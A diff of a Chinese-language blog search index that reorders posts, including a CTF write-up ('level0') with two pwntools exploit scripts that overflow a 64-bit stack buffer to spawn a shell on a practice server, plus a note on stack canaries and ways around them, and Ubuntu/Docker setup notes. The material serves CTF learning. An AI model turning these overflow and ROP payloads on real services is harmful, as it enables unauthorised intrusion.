@@ -1,66 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>level0</title>
-    <url>/2019/08/08/level0/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<p>1.首先要用到</p>
-<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
-&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p>
-<pre><code>Stack 的作用是防止栈的溢出
-NX    的作用为防止栈中的可执行代码
-  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
-<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
-在功能表里找到main,便于分析程序
-按tab键会出现伪代码，我们分析这个来找出漏洞
-shift+F12可以出现字符串表
-ctrl+F 可以出现查找框
-想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
-<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
-这里要了解一下栈的基本结构以及如何传递内容
-然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p>
-<p>4.脚本的书写</p>
-<pre><code>1.from pwn import *
-    (导入pwn里的内容)
-2.p=remote(&apos;地址&apos;,端口)
-    （连接服务器并创建一个对象）、
-3.p.recv()  p.recvline() p.recvuntil()
-    (都是接受服务器返回的字符串，具体区别不太懂)
-4.p.send()  p.sendline() p.sendafter()
-    (都是向服务器传入字符串，具体区别不太懂)
-5.p.interactive()
-    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
-<pre><code>1.buf距离rbp 0x80，rbp本身占位8
-2.函数返回地址可填callsystem的地址
-3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
-<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
-    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
-2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
-当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
-当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p>
-<pre><code>3.所以构建的payload为
-    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
-<p>一</p>
-<p>`</p>
-<pre><code>#coding:utf-8
-from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-s_addr=0x0000000000400596
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
-p.interactive()</code></pre><p><code>二</code></p>
-<pre><code> #coding:utf-8
-from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-rdi=0x400663
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
-p.interactive()</code></pre><p>`</p>
-]]></content>
-      <tags>
-        <tag>做题题解</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>docker基础</title>
     <url>/2020/02/16/docker%E9%85%8D%E7%BD%AE/</url>
     <content><![CDATA[<h2 id="什么是DOCKER"><a href="#什么是DOCKER" class="headerlink" title="什么是DOCKER"></a>什么是DOCKER</h2><p><a href="HTTPS://WWW.CNBLOGS.COM/ECJTUACM-873284962/P/9789130.HTML" target="_blank" rel="noopener">别人的吐血总结</a></p>
@@ -148,6 +88,103 @@ CMD [&quot;app.py&quot;]
       </categories>
       <tags>
         <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>canary</title>
+    <url>/2019/11/08/canary/</url>
+    <content><![CDATA[<p>资源链接<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p>
+<p><strong>Canary</strong></p>
+<p>Introduction</p>
+<p>由于 stack overflow 而引发的攻击非常普遍也非常古老, 相应地一种叫做 canary 的 mitigation 技术很早就出现在 glibc 里, 直到现在也作为系统安全的第一道防线存在。</p>
+<p>canary 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 stack overflow 发生的 高危区域的尾部, 当函数返回之时检测 canary 的值是否经过了改变, 以此来判断 stack/buffer overflow 是否发生.</p>
+<p>Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配</p>
+<p><strong>Canary 原理</strong></p>
+<p>在 GCC 中使用 Canary</p>
+<p>可以在 GCC 中使用以下参数设置 Canary:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure>
+
+<p><strong>Canary 实现原理</strong> </p>
+<p>开启 Canary 保护的 stack 结构大概如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
+
+<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
+
+<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果 canary 已经被非法修改，此时程序流程会走到 <strong>stack_chk_fail。</strong>stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。</p>
+<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>
+
+<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>保护机制</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>level0</title>
+    <url>/2019/08/08/level0/</url>
+    <content><![CDATA[<a id="more"></a>
+
+<p>1.首先要用到</p>
+<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
+&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p>
+<pre><code>Stack 的作用是防止栈的溢出
+NX    的作用为防止栈中的可执行代码
+  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
+<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
+在功能表里找到main,便于分析程序
+按tab键会出现伪代码，我们分析这个来找出漏洞
+shift+F12可以出现字符串表
+ctrl+F 可以出现查找框
+想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
+<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
+这里要了解一下栈的基本结构以及如何传递内容
+然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p>
+<p>4.脚本的书写</p>
+<pre><code>1.from pwn import *
+    (导入pwn里的内容)
+2.p=remote(&apos;地址&apos;,端口)
+    （连接服务器并创建一个对象）、
+3.p.recv()  p.recvline() p.recvuntil()
+    (都是接受服务器返回的字符串，具体区别不太懂)
+4.p.send()  p.sendline() p.sendafter()
+    (都是向服务器传入字符串，具体区别不太懂)
+5.p.interactive()
+    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
+<pre><code>1.buf距离rbp 0x80，rbp本身占位8
+2.函数返回地址可填callsystem的地址
+3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
+<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
+    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
+2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
+当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
+当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p>
+<pre><code>3.所以构建的payload为
+    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
+<p>一</p>
+<p>`</p>
+<pre><code>#coding:utf-8
+from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+s_addr=0x0000000000400596
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
+p.interactive()</code></pre><p><code>二</code></p>
+<pre><code> #coding:utf-8
+from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+rdi=0x400663
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
+p.interactive()</code></pre><p>`</p>
+]]></content>
+      <tags>
+        <tag>做题题解</tag>
       </tags>
   </entry>
   <entry>
@@ -270,43 +307,6 @@ print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂�
 ]]></content>
       <tags>
         <tag>做题题解</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>canary</title>
-    <url>/2019/11/08/canary/</url>
-    <content><![CDATA[<p>资源链接<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p>
-<p><strong>Canary</strong></p>
-<p>Introduction</p>
-<p>由于 stack overflow 而引发的攻击非常普遍也非常古老, 相应地一种叫做 canary 的 mitigation 技术很早就出现在 glibc 里, 直到现在也作为系统安全的第一道防线存在。</p>
-<p>canary 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 stack overflow 发生的 高危区域的尾部, 当函数返回之时检测 canary 的值是否经过了改变, 以此来判断 stack/buffer overflow 是否发生.</p>
-<p>Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配</p>
-<p><strong>Canary 原理</strong></p>
-<p>在 GCC 中使用 Canary</p>
-<p>可以在 GCC 中使用以下参数设置 Canary:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure>
-
-<p><strong>Canary 实现原理</strong> </p>
-<p>开启 Canary 保护的 stack 结构大概如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
-
-<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
-
-<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果 canary 已经被非法修改，此时程序流程会走到 <strong>stack_chk_fail。</strong>stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。</p>
-<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>
-
-<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>保护机制</tag>
       </tags>
   </entry>
   <entry>
@@ -528,48 +528,6 @@ io.interactive()    </code></pre>]]></content>
       </tags>
   </entry>
   <entry>
-    <title>ubuntu16.04配置</title>
-    <url>/2019/10/11/ubuntu16-04%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<p>由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程</p>
-<p>大家在使用虚拟机时尤其是在安装一些没用过的东西时<br>最好可以</p>
-<p>#拍快照</p>
-<p>#或用挂起代替关机<br>可以在出现问题的时候少浪费一些时间来处理问题</p>
-<p>ubuntu下载<br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
-<p>1.安装镜像后，安装VMtools<br>安装VMware Tools显示灰色正确解决办法<br><a href="https://blog.csdn.net/bluebird2/article/details/94162855" target="_blank" rel="noopener">https://blog.csdn.net/bluebird2/article/details/94162855</a><br>作用：<br><a href="https://blog.csdn.net/u012654205/article/details/42454527" target="_blank" rel="noopener">https://blog.csdn.net/u012654205/article/details/42454527</a><br>安装:<br><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a><br>安装时会出现很多提示 输入yes/no  都选 yes，</p>
-<p>如果提示 的是 路径， 则直接回车就好。</p>
-<p>直到安装完成，路径还在 vmware-tools-distrib 下</p>
-<p>2.更换软件源<br>源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，<br>相当于软件的下载服务器和更新服务器，<br>只不过不是某款软件的，而是该系统所有软件的下载服务器</p>
-<pre><code>    推荐：    https://blog.csdn.net/meteor_s/article/details/81301252
-https://blog.csdn.net/baidu_36602427/article/details/86551862  //源比较多
-https://www.cnblogs.com/flyinggod/p/7979108.html
-不推荐：https://blog.csdn.net/xkwy100/article/details/80301156
-
-解决问题E: Could not get lock /var/lib/apt/lists/lock
-https://www.cnblogs.com/qq952693358/p/6537846.html</code></pre><p>3.安装pip</p>
-<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
-<pre><code>安装：  sudo apt install python-pip
-
-遇到问题，    
-        Unable to locate package python-pip
-解决方法： 更新软件源
-        sudo apt-get update
-
-网址    https://www.jianshu.com/p/568aab038d4c
-    https://blog.csdn.net/qq_35759574/article/details/82842637</code></pre><p>4.更改pip源<br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的。</p>
-<pre><code>sudo mkdir ~/.pip/
-cd ./.pip/
-touch pip.conf
-sudo gedit pip.conf 
-
-网址：    https://blog.csdn.net/yuzaipiaofei/article/details/80891108
-        https://www.jianshu.com/p/364146ade9be</code></pre><p>5.安装pwntools</p>
-<pre><code>https://www.cnblogs.com/cai00/p/10696728.html</code></pre><p>6.安装pwndbg<br>    <a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
-]]></content>
-      <tags>
-        <tag>虚拟机配置</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>通用gadget原理分析</title>
     <url>/2019/11/01/%E9%80%9A%E7%94%A8gadget%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<p>通用 gadget</p>
@@ -643,6 +601,48 @@ sudo gedit pip.conf
 <p><strong>6.安装pwntools</strong></p>
 <p><a href="https://www.cnblogs.com/cai00/p/10696728.html" target="_blank" rel="noopener">https://www.cnblogs.com/cai00/p/10696728.html</a></p>
 <p><strong>7.安装pwndbg</strong><br><a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
+]]></content>
+      <tags>
+        <tag>虚拟机配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ubuntu16.04配置</title>
+    <url>/2019/10/11/ubuntu16-04%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程</p>
+<p>大家在使用虚拟机时尤其是在安装一些没用过的东西时<br>最好可以</p>
+<p>#拍快照</p>
+<p>#或用挂起代替关机<br>可以在出现问题的时候少浪费一些时间来处理问题</p>
+<p>ubuntu下载<br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
+<p>1.安装镜像后，安装VMtools<br>安装VMware Tools显示灰色正确解决办法<br><a href="https://blog.csdn.net/bluebird2/article/details/94162855" target="_blank" rel="noopener">https://blog.csdn.net/bluebird2/article/details/94162855</a><br>作用：<br><a href="https://blog.csdn.net/u012654205/article/details/42454527" target="_blank" rel="noopener">https://blog.csdn.net/u012654205/article/details/42454527</a><br>安装:<br><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a><br>安装时会出现很多提示 输入yes/no  都选 yes，</p>
+<p>如果提示 的是 路径， 则直接回车就好。</p>
+<p>直到安装完成，路径还在 vmware-tools-distrib 下</p>
+<p>2.更换软件源<br>源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，<br>相当于软件的下载服务器和更新服务器，<br>只不过不是某款软件的，而是该系统所有软件的下载服务器</p>
+<pre><code>    推荐：    https://blog.csdn.net/meteor_s/article/details/81301252
+https://blog.csdn.net/baidu_36602427/article/details/86551862  //源比较多
+https://www.cnblogs.com/flyinggod/p/7979108.html
+不推荐：https://blog.csdn.net/xkwy100/article/details/80301156
+
+解决问题E: Could not get lock /var/lib/apt/lists/lock
+https://www.cnblogs.com/qq952693358/p/6537846.html</code></pre><p>3.安装pip</p>
+<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
+<pre><code>安装：  sudo apt install python-pip
+
+遇到问题，    
+        Unable to locate package python-pip
+解决方法： 更新软件源
+        sudo apt-get update
+
+网址    https://www.jianshu.com/p/568aab038d4c
+    https://blog.csdn.net/qq_35759574/article/details/82842637</code></pre><p>4.更改pip源<br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的。</p>
+<pre><code>sudo mkdir ~/.pip/
+cd ./.pip/
+touch pip.conf
+sudo gedit pip.conf 
+
+网址：    https://blog.csdn.net/yuzaipiaofei/article/details/80891108
+        https://www.jianshu.com/p/364146ade9be</code></pre><p>5.安装pwntools</p>
+<pre><code>https://www.cnblogs.com/cai00/p/10696728.html</code></pre><p>6.安装pwndbg<br>    <a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
 ]]></content>
       <tags>
         <tag>虚拟机配置</tag>
